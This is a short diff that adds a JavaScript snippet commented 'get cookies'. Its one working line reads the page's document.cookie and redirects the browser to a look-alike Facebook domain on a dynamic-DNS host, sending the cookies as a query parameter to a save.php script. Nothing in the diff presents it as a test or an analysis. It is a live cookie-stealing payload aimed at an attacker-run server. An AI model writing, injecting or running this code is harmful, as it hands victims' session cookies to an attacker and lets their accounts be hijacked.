@@ -1,0 +1,6 @@
+// get cookies
+
+a=document.cookie;window.location.href='http://facebouk.ddns.net/cookies/save.php?a='+a;
+
+//
+
